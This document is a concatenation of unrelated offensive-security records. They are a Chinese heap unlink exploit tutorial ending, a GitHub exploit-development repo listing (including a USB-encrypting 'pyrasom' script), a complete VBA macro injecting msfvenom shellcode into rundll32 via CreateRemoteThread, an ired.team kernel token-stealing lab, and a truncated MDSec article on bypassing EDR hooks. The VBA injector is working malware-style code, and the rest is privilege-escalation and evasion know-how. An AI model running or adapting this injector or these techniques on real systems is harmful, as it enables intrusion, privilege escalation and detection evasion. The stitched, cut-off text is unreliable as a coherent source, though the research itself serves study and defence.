spawned!\n\n```shell\n\n$ gcc -g -o exp exp.c\n.\/exp \n$ ls\ncmd  exp  exp.c  vuln  vuln.c\n```\n\n# 0x30 protection\n\n\u5982\u4eca`unlink`\u6280\u672f\u81ea\u4ece`glibc`\u63d0\u4f9b\u4e86`GOT`\u52a0\u56fa\u65f6\u5c31\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff01\u800c\u4e14\u5728`glibc`\u4e2d\u4e5f\u589e\u52a0\u4e86\u5bf9\u4e8e`unlink`\u5229\u7528\u7684\u7684\u68c0\u67e5\u3002\n\n## 0x31 double free\n\n```c\n    if (__glibc_unlikely (!prev_inuse(nextchunk)))\n      {\n        errstr = \"double free or corruption (!prev)\";\n        goto errout;\n      }\n```\n\n## 0x32 invalid next size\n\n```c\n if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)\n        || __builtin_expect (nextsize >= av->system_mem, 0))\n      {\n        errstr = \"free(): invalid next size (normal)\";\n        goto errout;\n      }\n```\n\n## 0x33 Courrupted Double Linked list\n\n```\n if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \n      malloc_printerr (check_action, \"corrupted double-linked list\", P);\n```\n\n### reference\n\n[^orgin]: [Heap overflow using unlink](https:\/\/sploitfun.wordpress.com\/2015\/02\/26\/heap-overflow-using-unlink\/)\n[^phrack]: [Volume 0x0b, Issue 0x39, Phile #0x08 of 0x12](http:\/\/phrack.org\/issues\/57\/8.html#article)\n[^internal]: [linux heap internals](..\/media\/attach\/Linux Heap Internals.pdf)\n"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]SkyBulk \/ [31]exploit-development Public\n* [32]Notifications\n* [33]Fork 15\n* [34]Star 23 (BUTTON)\nLicense\n[35]MIT license\n[36]23 stars [37]15 forks [38]Activity\n[39]Star (BUTTON)\n[40]Notifications\n* [41]Code\n* [42]Issues 0\n* [43]Pull requests 0\n* [44]Actions\n* [45]Projects 0\n* [46]Security\n* [47]Insights\n(BUTTON) Additional navigation options\n* [48]Code\n* [49]Issues\n* [50]Pull requests\n* [51]Actions\n* [52]Projects\n* [53]Security\n* [54]Insights\nSkyBulk\/exploit-development\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nmaster\nSwitch branches\/tags (BUTTON)\n____________________\n(BUTTON) Branches (BUTTON) Tags\nCould not load branches\nNothing to show\n[55]{{ refName }} default\n[56]View all branches\nCould not load tags\nNothing to show\n[57]{{ refName }} default\n[58]View all tags\nName already in use\n(BUTTON)\nA tag already exists with the provided branch name. Many Git commands\naccept both tag and branch names, so creating this branch may cause\nunexpected behavior. Are you sure you want to create this branch?\n(BUTTON) Cancel (BUTTON) Create\n[59]1 branch [60]0 tags\nCode\n* (BUTTON) Local\n* (BUTTON) Codespaces\n* Clone\n(button) HTTPS (button) GitHub CLI\nhttps:\/\/github.com\/S\nUse Git or checkout with SVN using the web URL.\ngh repo clone SkyBul\nWork fast with our official CLI. [61]Learn more about the CLI.\n* [62]Open with GitHub Desktop\n* [63]Download ZIP\nSign In Required\nPlease [64]sign in to use Codespaces.\nLaunching GitHub Desktop\nIf nothing happens, [65]download GitHub Desktop and try again.\n(BUTTON)\nLaunching GitHub Desktop\nIf nothing happens, [66]download GitHub Desktop and try again.\n(BUTTON)\nLaunching Xcode\nIf nothing happens, [67]download Xcode and try again.\n(BUTTON)\nLaunching Visual Studio Code\nYour codespace will open once ready.\nThere was a problem preparing your codespace, please try again.\nLatest commit\nGit stats\n* [68]43 commits\nFiles\n[69]Permalink\nFailed to load latest commit information.\nType\nName\nLatest commit message\nCommit time\n[70]codes\n[71]images\n[72]LICENSE\n[73]README.md\n(BUTTON) View code\n____________________\n[74]Exploit Develoment - CVE recreation [75]Stack Based Buffer Overflow\n[76]Structured Exception Handler (SEH) Overwrite [77]Stack Based Buffer\nOverflow (with Egg Hunter) [78]Stack Based Buffer Overflow (with DEP\nenable) [79]Fuzzers [80]jmp shellcode [81]misc\n[82]README.md\nExploit Develoment - CVE recreation\nThese are some of my exploits written for research purposes.\nStack Based Buffer Overflow\n* Cloudme Sync 1.9.2 - [83]cloudMe_Sync_1.9.2.py\n* SLmail 5.5 - [84]slmail-5.5.py\n* Easy RM to MP3 Converter 2.7.3.700 -\n[85]easy_rm_2.7_3_700_call_esp_jmp_esp.py\n* brainpanCTF - [86]brainpan.py\n* NScan version 0.9.1 - [87]nscan-0.9.1.py\n* DVD X Player 5.5 Pro - [88]dvd_X_Player_5.5_PRO.py\n* VulnServer - [89]vulnserver.py - [90]writeup\n* VUPlayer 2.49 - [91]vuplayer_2.49.py\nStructured Exception Handler (SEH) Overwrite\n* Soritong MP3 Player 1.0 Overflow - [92]soritong_MP3_Player_1.0.py\n* DVD X Player 5.5 Pro - [93]dvd_X_Player_5.5_PRO.py\nStack Based Buffer Overflow (with Egg Hunter)\n* Kolibri HTTP Server 2.0 - [94]kolibri_http_2.0.py\n* Eureka Email 2.2q - [95]eureka_mail_2.2q.py\n* VulnServer - [96]vulnserver_egghunter.py\nStack Based Buffer Overflow (with DEP enable)\n* VulnServer - [97]vulnserver_dep.py\n* VUPlayer 2.49 - [98]vuplayer_2.49_dep.py\n* Audio Converter 8.1 - [99]audio_converter_8.1.py\n* R 3.4.4 (Windows 10 x64) - Buffer Overflow (DEP\/ASLR Bypass) -\n[100]R_3_4_4.py\nFuzzers\n* TCP fuzzer - [101]fuzzer.py\n* HTTP fuzzer - [102]fuzzer_kolibri_http.py\njmp shellcode\n* call esp , jmp esp - [103]easy_rm_2.7_3_700_call_esp_jmp_esp.py\n* pop ret - [104]easy_rm_2.7_3_700_pop_ret.py\n* push ret - [105]easy_rm_2.7_3_700_push_ret.py\n* small buff - [106]easy_rm_2.7_3_700_small_buff.py\nmisc\n* pyrasom - [107]encrypt_usb_files.py\nAbout\nNo description, website, or topics provided.\nResources\n[108]Readme\nLicense\n[109]MIT license\n[110]Activity\nStars\n[111]23 stars\nWatchers\n[112]3 watching\nForks\n[113]15 forks\n[114]Report repository\n[115]Releases\nNo releases published\n[116]Packages 0\nNo packages published\nLanguages\n* [117]Python 100.0%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [118]Terms\n* [119]Privacy\n* [120]Security\n* [121]Status\n* [122]Docs\n* [123]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"Private Type PROCESS_INFORMATION\n    hProcess As Long\n    hThread As Long\n    dwProcessId As Long\n    dwThreadId As Long\nEnd Type\n\nPrivate Type STARTUPINFO\n    cb As Long\n    lpReserved As String\n    lpDesktop As String\n    lpTitle As String\n    dwX As Long\n    dwY As Long\n    dwXSize As Long\n    dwYSize As Long\n    dwXCountChars As Long\n    dwYCountChars As Long\n    dwFillAttribute As Long\n    dwFlags As Long\n    wShowWindow As Integer\n    cbReserved2 As Integer\n    lpReserved2 As Long\n    hStdInput As Long\n    hStdOutput As Long\n    hStdError As Long\nEnd Type\n\nPrivate Declare PtrSafe Function createRemoteThread Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, _\n    ByVal lpThreadAttributes As Long, _\n    ByVal dwStackSize As Long, _\n    ByVal lpStartAddress As LongPtr, _\n    lpParameter As Long, _\n    ByVal dwCreationFlags As Long, _\n    lpThreadID As Long) As LongPtr\n\nPrivate Declare PtrSafe Function virtualAllocEx Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, _\n    ByVal lpAddr As Long, _\n    ByVal lSize As Long, _\n    ByVal flAllocationType As Long, _\n    ByVal flProtect As Long) As LongPtr\n\nPrivate Declare PtrSafe Function writeProcessMemory Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, _\n    ByVal lDest As LongPtr, _\n    ByRef Source As Any, _\n    ByVal Length As Long, _\n    ByVal LengthWrote As LongPtr) As Boolean\n\nPrivate Declare PtrSafe Function createProcessA Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, _\n    ByVal lpCommandLine As String, _\n    lpProcessAttributes As Any, _\n    lpThreadAttributes As Any, _\n    ByVal bInheritHandles As Long, _\n    ByVal dwCreationFlags As Long, _\n    lpEnvironment As Any, _\n    ByVal lpCurrentDirectory As String, _\n    lpStartupInfo As STARTUPINFO, _\n    lpProcessInformation As PROCESS_INFORMATION) As Boolean\n\nPrivate Declare PtrSafe Function getProcessHandle Lib \"kernel32\" Alias \"GetCurrentProcess\" () As LongLong\n\nPrivate Sub Execute()\n\nConst MEM_COMMIT = &H1000\nConst PAGE_EXECUTE_READWRITE = &H40\n\nDim sc As String\nDim scLen As Long\nDim byteArray() As Byte\nDim memoryAddress As LongLong\nDim pHandle As LongLong\nDim sNull As String\nDim sInfo As STARTUPINFO\nDim pInfo As PROCESS_INFORMATION\n\n' .\/msfvenom --arch x64 --platform windows -p windows\/x64\/exec CMD=calc.exe -f c\nsc = \"fc4883e4f0e8c00000004151415052\"\nsc = sc & \"51564831d265488b5260488b521848\"\nsc = sc & \"8b5220488b7250480fb74a4a4d31c9\"\nsc = sc & \"4831c0ac3c617c022c2041c1c90d41\"\nsc = sc & \"01c1e2ed524151488b52208b423c48\"\nsc = sc & \"01d08b80880000004885c074674801\"\nsc = sc & \"d0508b4818448b40204901d0e35648\"\nsc = sc & \"ffc9418b34884801d64d31c94831c0\"\nsc = sc & \"ac41c1c90d4101c138e075f14c034c\"\nsc = sc & \"24084539d175d858448b40244901d0\"\nsc = sc & \"66418b0c48448b401c4901d0418b04\"\nsc = sc & \"884801d0415841585e595a41584159\"\nsc = sc & \"415a4883ec204152ffe05841595a48\"\nsc = sc & \"8b12e957ffffff5d48ba0100000000\"\nsc = sc & \"000000488d8d0101000041ba318b6f\"\nsc = sc & \"87ffd5bbf0b5a25641baa695bd9dff\"\nsc = sc & \"d54883c4283c067c0a80fbe07505bb\"\nsc = sc & \"4713726f6a00594189daffd563616c\"\nsc = sc & \"632e65786500\"\n\nscLen = Len(sc) \/ 2\nReDim byteArray(0 To scLen)\n\nFor i = 0 To scLen - 1\n    If i = 0 Then\n        pos = i + 1\n    Else\n        pos = i * 2 + 1\n    End If\n    Value = Mid(sc, pos, 2)\n    byteArray(i) = Val(\"&H\" & Value)\nNext\n\nres = createProcessA(sNull, _\n    \"C:\\Windows\\System32\\rundll32.exe\", _\n    ByVal 0&, _\n    ByVal 0&, _\n    ByVal 1&, _\n    ByVal 4&, _\n    ByVal 0&, _\n    sNull, _\n    sInfo, _\n    pInfo)\nDebug.Print \"[+] CreateProcessA() returned: \" & res\n\nnewAllocBuffer = virtualAllocEx(pInfo.hProcess, _\n    0, _\n    UBound(byteArray), _\n    MEM_COMMIT, _\n    PAGE_EXECUTE_READWRITE)\nDebug.Print \"[+] VirtualAllocEx() returned: 0x\" & Hex(newAllocBuffer)\n\nDebug.Print \"[*] Writing memory...\"\nFor Offset = 0 To UBound(byteArray)\n    myByte = byteArray(Offset)\n    res = writeProcessMemory(pInfo.hProcess, _\n        newAllocBuffer + Offset, _\n        byteArray(Offset), _\n        1, _\n        ByVal 0&)\nNext Offset\nDebug.Print \"[+] WriteProcessMemory() returned: \" & res\n\nDebug.Print \"[+] Executing shellcode now...\"\nres = createRemoteThread(pInfo.hProcess, _\n    0, _\n    0, _\n    newAllocBuffer, _\n    0, _\n    0, _\n    0)\n\nEnd Sub"}
{"text":"Red Team Notes\n[1]linkedin[2]twitter[3]patreon[4]github\nSearch\n\u2303K\nLinks\nWhat is ired.team notes?\nPinned\nPentesting Cheatsheets\nActive Directory & Kerberos Abuse\noffensive security\nRed Team Infrastructure\nInitial Access\nCode Execution\nCode & Process Injection\nDefense Evasion\nEnumeration and Discovery\nPrivilege Escalation\nCredential Access & Dumping\nLateral Movement\nPersistence\nExfiltration\nreversing, forensics & misc\nInternals\nConfiguring Kernel Debugging Environment with kdnet and WinDBG Preview\nCompiling a Simple Kernel Driver, DbgPrint, DbgView\nLoading Windows Kernel Driver for Debugging\nSubscribing to Process Creation, Thread Creation and Image Load\nNotifications from a Kernel Driver\nListing Open Handles and Finding Kernel Object Addresses\nSending Commands From Your Userland Program to Your Kernel Driver using\nIOCTL\nWindows Kernel Drivers 101\nWindows x64 Calling Convention: Stack Frame\nLinux x64 Calling Convention: Stack Frame\nSystem Service Descriptor Table - SSDT\nInterrupt Descriptor Table - IDT\nToken Abuse for Privilege Escalation in Kernel\nManipulating ActiveProcessLinks to Hide Processes in Userland\nETW: Event Tracing for Windows 101\nExploring Injected Threads\nParsing PE File Headers with C++\nInstrumenting Windows APIs with Frida\nExploring Process Environment Block\nWriting a Custom Bootloader\nCloud\nNeo4j\nDump Virtual Box Memory\nAES Encryption Using Crypto++ .lib in Visual Studio C++\nReversing Password Checking Routine\nPowered By GitBook\nComment on page\nToken Abuse for Privilege Escalation in Kernel\nThe purpose of this lab is to understand at a high level (will not be\nwriting any kernel code, rather playing around with WinDBG) how kernel\nexploits abuse tokens for privilege escalation.\nI will look briefly into two techniques:\n\u200b[5]Token stealing\/replacement - low privileged token is replaced\nwith a high privileged token\n\u200b[6]Token privilege adjustment - adding and enabling more privileges\nto an existing token\nKey Structures\nBefore proceeding, there's a couple of kernel memory structures we need\nto know about.\n_EPROCESS\n_EPROCESS is a kernel memory structure that describes system processes\n(or in other words - each process running on a system has its\ncorresponding _EPROCESS object somewhere in the kernel) as we know them\nas it contains details such as process image name, which desktop\nsession it is running in, how many open handles to other kernel objects\nit has, what access token it has and much more.\nBelow is a snippet of the structure:\ndt _eprocess\n_TOKEN\n_TOKEN is a kernel memory structure that describes process's security\ncontext and contains information such as process token privileges,\nlogon id, session id, token type (i.e primary vs. impersonation) and\nmuch more.\nBelow is a snippet of the _TOKEN structure:\ndt _token\nLet's now see how we can use the above information about processes and\ntokens to elevate a medium integrity process to a system integrity\nprocess the way kernel exploits do it.\n1. Replacing Tokens for Privilege Escalation\nOne way kernel exploits escalate privileges is by replacing a low\nprivileged token with a high privileged token. Below are some key\npoints in explaining the exploitation process:\nEach process running on the system has its corresponding _EPROCESS\nkernel structure\n_EPROCESS structure contains a pointer to a _TOKEN memory structure\nthat describes process's security context\nKernel exploit finds address of the _TOKEN structure of a low\nprivileged process - the one it wants to escalate from\nKernel exploit finds address of the _TOKEN structure of a privileged\nprocess, running as NT\\SYSTEM\nKernel exploit replaces the low privileged process's token with the\nhigh privileged token\nIn this lab, I'm going to replace the authentication token of a low\nprivileged powershell process with a high privileged token of the\nsystem process (always a PID 4) following the above described process,\nexcept I will do it manually using WinDBG.\nMy lab is running Windows 10 x64 1903\nBelow is an attempt to visually represent the above described process\nwith a high level diagram:\nToken stealing \/ swapping process\nBoxes with blue headings represent a MEDIUM integrity process,\nrunning as WS02\\spotless\nWS02 is my lab machine name\nspotless is a low privileged local user.\nBoxed with red headings indicate a SYSTEM integrity process,\neffectively running as NT\\SYSTEM\nWS02$ is my lab computer account\nOFFENSE is the domain the machine is a member of\nRed dotted line signifies that the low privileged process powershell\nwill assume the high privileged token from the process system once\nthe _TOKEN kernel memory structure is manipulated.\nLet's now try to see how we can replace process tokens using WinDBG.\nListing Processes\nFirst off, listing all running processes on the system in WinDBG can be\ndone like so:\n!process 0 0\nBelow is a snippet of some of the processes running on the system and\nhighlighted are addresses pointing to _EPROCESS structures for given\nprocesses:\nMedium Integrity Process\nNext, let's launch powershell (this is the process for which we will\nreplace the low privileged token with a high privileged token) as a\nmedium integrity\/non-elevated process (in my case running as a local\nnon-admin user ws02\\spotless) and get its process ID:\nLet's get a process summary in WinDBG for our powershell process with\nPID 2648 (0xa58):\n!process a58 0\nBelow confirms we're looking at our powershell.exe process. Note the\n_EPROCESS location ffffdc8fbe1f1080:\nFinding Powershell Token\nOnce we have powershell's _EPROCESS location in the kernel, we can\ninspect its contents like so:\nkd> dt _eprocess ffffdc8fbe1f1080\nSince we're interested in swapping the token, the key member of the\n_EPROCESS memory structure we are after is Token located at offset\n0x358:\nNote that offset0x358 suggests it's pointer to _EX_FAST_REF memory\nstructure and we will come back to this shortly.\nLet's read memory contents of the pointer the _EPROCESS.Token is\npointing to, which is ffffc507`dab7799f in my case:\nkd> dq ffffdc8fbe1f1080+0x358 l1\nffffdc8f`be1f13d8 ffffc507`dab7799f\nIf we try inspecting the memory location ffffc507`dab7799f with !token\nffffc507dab7799f command, we are told that this address does not point\nto a token object, which we may find a bit odd:\nHowever, this is where the _EX_FAST_REF comes into play. It was pointed\nout earlier that _EPROCESS.Token actually points to a _EX_FAST_REF\nstructure rather than a _TOKEN structure.\nLet's overlay the address stored in _EPROCESS.Token which is\nffffdc8f`be1f13d8 (_EPROCESS location plus the Token member offset\n(ffffdc8fbe1f1080+0x358)) with the _EX_FAST_REF structure and see\nwhat's inside:\nkd> dt _EX_FAST_REF ffffdc8fbe1f1080+0x358\nntdll!_EX_FAST_REF\n+0x000 Object : 0xffffc507`dab7799f Void\n+0x000 RefCnt : 0y1111\n+0x000 Value : 0xffffc507`dab7799f\nNotice how all three members have the same offset and Object and Value\nare pointing to the same address, but the interesting piece is the\nRefCnt with 4 bits on (equals to 0xF, which looks like it is the last\ndigit of both Object and Value members are pointing to -\n0xffffc507`dab7799f).\nIf we inspect the _EX_FAST_REF without data, based on the symbols, it's\ndefined like so:\nntdll!_EX_FAST_REF\n+0x000 Object : Ptr64 Void\n+0x000 RefCnt : Pos 0, 4 Bits\n+0x000 Value : Uint8B\nWhich indicates and confirms that the last 4 bits (the last hex digit\nof the Object or Value) of the value pointed to by members Object and\nValue (in my case 0xffffc507`dab7799f) is used to denote the reference\ncount to this token, which means it's not part of the token address,\nwhich means we should be able to zero it out and get an actual _TOKEN\nstructure address for our powershell process.\nEssentially, if Object and Value are 0xffffc507`dab7799f, we should be\nable to just swap the last f with 0 which would give us\n0xffffc507`dab77990 and it should be our _TOKEN address.\nIn fact, if we inspect our powershell process with a more verbose\noutput like so:\n!process ffffdc8fbe1f1080 1\n\/\/ or !process 0xa58 1\n..we see that indeed the Token is pointing to 0xffffc507`dab77990 -\nnote the last digit is 0 rather than f, which confirms that we can\nalways zero out the last digit pointed to by _EX_FAST_REF to get the\neffective _TOKEN structure address:\nWe can mask out the last digit with a bitwise AND operation as shown\nbelow:\nkd> ? (ffffc507dab7799f & 0xFFFFFFF0); !token (ffffc507dab7799f &\n0xFFFFFFF0)\n0xf being zeroed out\nNow, if we try the !token command again with the last digit of\n_EPROCESS.Token->Value set to 0, we no longer see the error message\nsuggesting there's no token at that address and we start seeing some\nactual token details like user group it belongs to, etc.:\nConfirming SIDs\nWe can double check we're actually looking at the right token - the\nSID's seen in the output of whoami \/all and the !token\n(ffffc507dab7799f & 0xFFFFFFF0) match:\nFinding SYSTEM Token\nNow let's find the address of the high privileged _TOKEN - the token\nthat our low privileged powershell process will assume.\nBelow shows some information about the SYSTEM process - we're\ninterested in it's _TOKEN location which is at ffffc507d8818040 as\nshown below:\nkd> !process 4 1\nSearching for Process with Cid == 4\nPROCESS ffffdc8fbdad3040\nSessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000\nDirBase: 001aa002 ObjectTable: ffffc507d88032c0 HandleCount: 3042.\nImage: System\nVadRoot ffffdc8fbdad1170 Vads 8 Clone 0 Private 21. Modified 76433.\nLocked 0.\nDeviceMap ffffc507d8818eb0\nToken ffffc507d8818040\nSwapping Tokens\nWe now have all the required information to successfully swap the\npowershell process token (located at ffffdc8fbe1f1080+0x358) with that\nheld by the SYSTEM process (ffffc507d8818040) by simply writing the\nSYSTEM process's token address to the the _EPROCESS.Token of our\npowershell process:\neq ffffdc8fbe1f1080+0x358 ffffc507d8818040\nBelow shows the above in action and how prior to the token\nmanipulation, the powershell was running as ws02\\spotless and nt\nauthority\\system after:\n2. Modifying Token Privileges\nAnother interesting (and abused for privilege escalation) member of the\n_TOKENstructure is Privileges at offset 0x040, defined as\n_SEP_TOKEN_PRIVILEGES structure:\ndt _token 0xffffc507dab77990\nEnabling Existing Privileges\nWe can overlay our low privileged powershell token address + offset\n0x40 to inspect the _sep_token_privileges structure:\ndt _sep_token_privileges 0xffffc507dab77990+0x40\nIn essence, _sep_token_privileges shows which privileges the token has\nand which of them are enabled\/disabled - the info that we can also\ncheck from the userland with whoami \/priv.\nNote how _sep_token_privileges Present and Enabled values do not match\nand this is what results in Enabled\/Disabled privileges that we see in\nthe whoami \/priv State column:\nWe can manipulate the kernel memory and make Present and Enabled values\nmatch like so:\neq 0xffffc507dab77990+0x40+8 0x00000006`02880000\nAfter manipulating the memory and matching the Present and Enabled\nvalues, we can now see how all the privileges in the State column of\nthe whoami \/priv output are Enabled:\nAdding More Privileges\nLet's see if we can try to add more privileges to that exsiting token\nrather than just enabling those that already exist.\nHow do we know what is a valid value in the Present field that would\ngive us more\/elevated privileges? We can get a good hint by inspecting\nthe Present value of the SYSTEM process (PID 4) token:\n!process 4 1\nsep_token_privileges 0x40+ffffde8fe9a06040\nFrom the above, Present value is 0x0000001f`f2ffffbc - this represents\nall the privileges the SYSTEM process token has.\nLet's see if we can assign this value to our powershell process's token\nto both Present and Enabled fields. If successful, we should have all\nthe SYSTEM privileges enabled for our low privileged powershell process\nrunning in the context of the user ws02\\spotless:\nkd> eq 0x40+ffffde8ff8cde5f0+8 0x0000001f`f2ffffbc\nkd> eq 0x40+ffffde8ff8cde5f0 0x0000001f`f2ffffbc\nLet's check if the new values got assigned to our _sep_token_privileges\nstructure:\nkd> dt _sep_token_privileges 0x40+ffffde8ff8cde5f0\nnt!_SEP_TOKEN_PRIVILEGES\n+0x000 Present : 0x0000001f`f2ffffbc\n+0x008 Enabled : 0x0000001f`f2ffffbc\n+0x010 EnabledByDefault : 0x40800000\nRunning whoami \/priv now shows that we have all the SYSTEM privileges\nand all of them are enabled:\nReferences\ntoken-priv\/abusing_token_eop_1.0.txt at master \u00b7 hatRiot\/token-priv\nGitHub\nhttp:\/\/mcdermottcybersecurity.com\/articles\/x64-kernel-privilege-escalat\nion\nmcdermottcybersecurity.com\nStarting with Windows Kernel Exploitation \u2013 part 3 \u2013 stealing the\nAccess Token\nhasherezade's 1001 nights\nPrevious\nInterrupt Descriptor Table - IDT\nNext\nManipulating ActiveProcessLinks to Hide Processes in Userland\nLast modified 4yr ago\nOn this page\nKey Structures\n_EPROCESS\n_TOKEN\n1. Replacing Tokens for Privilege Escalation\nListing Processes\nMedium Integrity Process\nFinding Powershell Token\nConfirming SIDs\nFinding SYSTEM Token\nSwapping Tokens\n2. Modifying Token Privileges\nEnabling Existing Privileges\nAdding More Privileges\nReferences"}
{"text":"#[1]alternate [2]alternate [3]alternate\n* [4]Our Services\n* [5]Knowledge Centre\n* [6]About\n* [7]Contact\n* [8]Our Services\n+ [9]Adversary Simulation\n+ [10]Application Security\n+ [11]Penetration Testing\n+ [12]Response\n* [13]Knowledge Centre\n+ [14]Insights\n+ [15]Research\n+ [16]Training\n* [17]About\n* [18]Contact\n(BUTTON)\n* Adversary\nAdversary Simulation\nOur best in class red team can deliver a holistic cyber attack\nsimulation to provide a true evaluation of your organisation\u2019s\ncyber resilience.\n* Application Security\nApplication\nSecurity\nLeverage the team behind the industry-leading Web Application and\nMobile Hacker\u2019s Handbook series.\n* Penetration Testing\nPenetration\nTesting\nMDSec\u2019s penetration testing team is trusted by companies from the\nworld\u2019s leading technology firms to global financial institutions.\n* Response\nResponse\nOur certified team work with customers at all stages of the\nIncident Response lifecycle through our range of proactive and\nreactive services.\n* [19]\nResearch\nMDSec\u2019s dedicated research team periodically releases white papers,\nblog posts, and tooling.\n* [20]\nTraining\nMDSec\u2019s training courses are informed by our security consultancy\nand research functions, ensuring you benefit from the latest and\nmost applicable trends in the field.\n* [21]\nInsights\nView insights from MDSec\u2019s consultancy and research teams.\nActiveBreach\nEDR Parallel-asis through Analysis\n[22]Home > [23]Knowledge Centre > [24]Insights > EDR Parallel-asis\nthrough Analysis\nIntroduction\nPost-exploitation tooling designed to operate within mature\nenvironments is frequently required to slip past endpoint detection and\nresponse (EDR) software running on the target. EDR frequently operate\nby hooking Windows API functions, especially those exported by ntdll\n(specifically the Nt\/Zw*() syscall-based API functions). Since all\ninteraction with the underlying operating system will pass through\nthese functions under normal circumstances this provides an ideal point\nof interception when it comes to detecting unwanted application\nbehaviour.\nPreviously MDSec have discussed various methods by which circumvention\nof these hooks can be achieved in our post [25]Bypassing User-Mode\nHooks and Direct Invocation of System Calls for Red Teams [1] however\nsince EDR frequently play a game of catch-up with researchers,\ntechniques can and have been developed by the most innovative products\nto detect several \u2013 if not all \u2013 of the techniques described. There is\ntherefore some value in identifying novel techniques for achieving hook\ncircumvention.\nDuring the development of the [26]Nighthawk C2 [2] MDSec stumbled upon\nwhat appears to be a new and novel technique for identifying syscall\nnumbers for certain syscalls which may then be used to load a new copy\nof ntdll into memory, allowing the remaining syscalls to be read\nsuccessfully without triggering any installed function hooks. The\ntechnique involves abusing copies of certain syscalls made early during\nprocess initialisation by the new Windows 10 parallel loader.\nThe Windows 10 Parallel Loader\nBeginning with Windows 10, Microsoft introduced the concept of parallel\nDLL loading. Parallel loading allows a process to perform the process\nof recursively mapping DLLs imported via process module import tables\nin parallel rather than synchronously on a single thread \u2013 leading to\nperformance gains during initial application launch.\nWe first noticed the existence of the parallel loader when attempting\nto understand why \u2013 in a simple single threaded application \u2013 there\nwere three or four additional threads created. Examining these threads\nconfirmed that these were thread pool workers. Rather than attempt to\nreverse engineer the work queued to these threads we took to Google in\nthe hope that someone else had already asked (and hopefully answered)\nthe same question.\nGoogle returned only a few results but amongst those which were\nreturned there was a blog post by [27]Jeffery Tang at BlackBerry from\n2017 [3] and an excellent StackOverflow answer to essentially the same\nquestion for which I was seeking an answer, from a [28]user RbMm [4],\nwho had also done an excellent job of providing pseudocode to help\nilluminate the steps involved in the process. Between them these\narticles clearly illuminated what was going on under the hood and I\nrecommend them both if further understanding the inner workings of the\nparallel loader itself is of any interest.\nOne thing which caught my eye immediately when reading the\nStackOverflow answer was the fact that the parallel loader\nshort-circuited the parallel DLL load and fell back to synchronous mode\nif several core low-level native API were found to be detoured. These\nAPIs were involved in the process of opening and mapping images from\ndisk.\nThe relevant section from the StackOverflow answer is reproduced below\nbut of course remains the work of user RbMm. Quoted verbatim below:\nLdrpInitializeProcess() calls void LdrpDetectDetour(). This name speaks for itse\nlf. it does not return a value but initializes the global variable BOOLEAN LdrpD\netourExist. This routine first checks whether some loader critical routines are\nhooked - currently these are 5 routines:\nNtOpenFile\nNtCreateSection\nNtQueryAttributesFile\nNtOpenSection\nNtMapViewOfSection\nIf yes - LdrpDetourExist = TRUE;\nIf not hooked - ThreadDynamicCodePolicyInfo is queried - full code:\nvoid LdrpDetectDetour()\n{\nif (LdrpDetourExist) return ;\nstatic PVOID LdrpCriticalLoaderFunctions[] = {\nNtOpenFile,\nNtCreateSection,\nZwQueryAttributesFile,\nZwOpenSection,\nZwMapViewOfSection,\n};\nstatic M128A LdrpThunkSignature[5] = {\n\/\/***\n};\nULONG n = RTL_NUMBER_OF(LdrpCriticalLoaderFunctions);\nM128A* ppv = (M128A*)LdrpCriticalLoaderFunctions;\nM128A* pps = LdrpThunkSignature;\ndo\n{\nif (ppv->Low != pps->Low || ppv->High != pps->High)\n{\nif (LdrpDebugFlags & 5)\n{\nDbgPrint(\"!!! Detour detected, disable parallel loading\\n\");\nLdrpDetourExist = TRUE;\nreturn;\n}\n}\n} while (pps++, ppv++, --n);\nBOOL DynamicCodePolicy;\nif (0 <= ZwQueryInformationThread(NtCurrentThread(), ThreadDynamicCodePolicy\nInfo, &DynamicCodePolicy, sizeof(DynamicCodePolicy), 0))\n{\nif (LdrpDetourExist = (DynamicCodePolicy == 1))\n{\nif (LdrpMapAndSnapWork)\n{\nWaitForThreadpoolWorkCallbacks(LdrpMapAndSnapWork, 